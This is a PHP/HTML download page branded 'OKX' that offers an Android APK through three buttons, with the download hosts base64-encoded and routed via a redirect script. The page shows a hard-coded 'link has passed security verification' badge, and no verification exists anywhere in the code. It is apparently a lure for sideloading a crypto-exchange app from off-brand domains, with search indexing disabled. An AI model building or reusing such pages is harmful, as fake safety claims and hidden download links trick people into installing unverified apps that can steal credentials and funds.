<?php
// 三个下载链接配置
$primaryUrl = 'https://static.glgle.cn/upgradeapp/okx-android_ACE529253.apk'; // 主用下载
$backupUrl1 = 'https://download.ouyi.win/okx-android_ACE529253.apk'; // 备用下载1
$backupUrl2 = 'https://ouyi.win/okx-android_ACE529253.apk'; // 备用下载2

// 加密处理
$encryptedPrimary = base64_encode($primaryUrl);
$encryptedBackup1 = base64_encode($backupUrl1);
$encryptedBackup2 = base64_encode($backupUrl2);
?>
<!DOCTYPE html>
<head>
  <meta charset="UTF-8">
  <meta name="robots" content="noindex, nofollow">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OKX</title>
  <style>
    :root {
      --primary: #13bd2c;
      --primary-hover: #0ea01f;
      --secondary: #6b7280;
      --success: #16a34a;
      --success-bg: #f0fdf4;
      --warning: #d97706;
      --warning-bg: #d5f5e5;
      --warning2: #b45309;
      --warning2-bg: #fef3c7;
    }
    
    body {
      font-family: 'Inter', system-ui, sans-serif;
      background: #f8fafc;
      color: #1e293b;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      line-height: 1.5;
    }
    
    .container {
      text-align: center;
      background: white;
      padding: 2.5rem;
      border-radius: 12px;
      box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1);
      max-width: 480px;
      width: 90%;
    }
    
    .security-badge {
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
      background: var(--success-bg);
      color: var(--success);
      padding: 0.5rem 1rem;
      border-radius: 999px;
      font-size: 1.2rem;
      margin-bottom: 1.5rem;
    }
    
    .security-badge svg {
      width: 1rem;
      height: 1rem;
    }
    
    .btn-group {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
      margin-top: 1.5rem;
    }
    
    .btn {
      padding: 0.875rem;
      border-radius: 8px;
      font-weight: 700;
      transition: all 0.2s;
      border: none;
      cursor: pointer;
      font-size: 1.3rem;
      font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', sans-serif;
      letter-spacing: 0.3px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .btn-primary {
      background-color: var(--primary);
      color: white;
    }
    
    .btn-primary:hover {
      background-color: var(--primary-hover);
    }
    
    .btn-secondary {
      background-color: var(--warning-bg);
      color: var(--warning);
    }
    
    .btn-secondary:hover {
      background-color: #fae1ee;
    }
    
    .btn-tertiary {
      background-color: var(--warning2-bg);
      color: var(--warning2);
    }
    
    .btn-tertiary:hover {
      background-color: #fde68a;
    }
    
    .loader {
      display: none;
      width: 1rem;
      height: 1rem;
      border: 2px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 1s linear infinite;
      margin-left: 0.5rem;
    }
    
    .btn:disabled {
      opacity: 0.7;
      cursor: not-allowed;
    }
    
    .btn.disabled {
      pointer-events: none;
    }
    
    .notice {
      margin-top: 1.5rem;
      font-size: 0.875rem;
      color: #6b7280;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="security-badge">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.857-9.809a.75.75 0 00-1.214-.882l-3.483 4.79-1.88-1.88a.75.75 0 10-1.06 1.061l2.5 2.5a.75.75 0 001.137-.089l4-5.5z" clip-rule="evenodd" />
      </svg>
      链接已安全验证
    </div>
    
    <h1>链接已通过安全验证</h1>
    <p>系统已自动为您选择最优下载通道</p>
      <h3 style="color: green;" >若Wifi下载慢，请切换至5G流量下载快</h3>
    <div class="btn-group">
      <button class="btn btn-primary" onclick="startDownload(event, 'primary')">
       主要下载通道
        <span class="loader" id="loader1"></span>
      </button>
      
      <button class="btn btn-secondary" onclick="startDownload(event, 'backup1')">
      备用下载地址 Ⅰ
        <span class="loader" id="loader2"></span>
      </button>
      
      <button class="btn btn-tertiary" onclick="startDownload(event, 'backup2')">
         备用下载地址 Ⅱ
        <span class="loader" id="loader3"></span>
      </button>
    </div>
    
    <p class="notice">如果主通道无法进入，请尝试备用通道</p>
  </div>

  <script>
    // 下载配置映射
    const downloadConfig = {
      primary: {
        loaderId: 'loader1',
        token: '<?php echo $encryptedPrimary; ?>'
      },
      backup1: {
        loaderId: 'loader2',
        token: '<?php echo $encryptedBackup1; ?>'
      },
      backup2: {
        loaderId: 'loader3',
        token: '<?php echo $encryptedBackup2; ?>'
      }
    };

    function startDownload(event, type) {
      // 阻止默认行为
      event.preventDefault();
      
      // 获取配置
      const config = downloadConfig[type];
      if (!config) return;
      
      // 获取元素
      const clickedBtn = event.currentTarget;
      const loader = document.getElementById(config.loaderId);
      
      // 更新UI状态
      clickedBtn.disabled = true;
      clickedBtn.classList.add('disabled');
      if (loader) loader.style.display = 'inline-block';
      
      // 使用新窗口打开下载
      const downloadWindow = window.open('about:blank', '_blank');
      downloadWindow.location.href = `redirect.php?type=${type}&token=${config.token}`;
      
      // 5秒后恢复按钮状态
      setTimeout(() => {
        clickedBtn.disabled = false;
        clickedBtn.classList.remove('disabled');
        if (loader) loader.style.display = 'none';
      }, 5000);
    }
  </script>
</body>
</html>

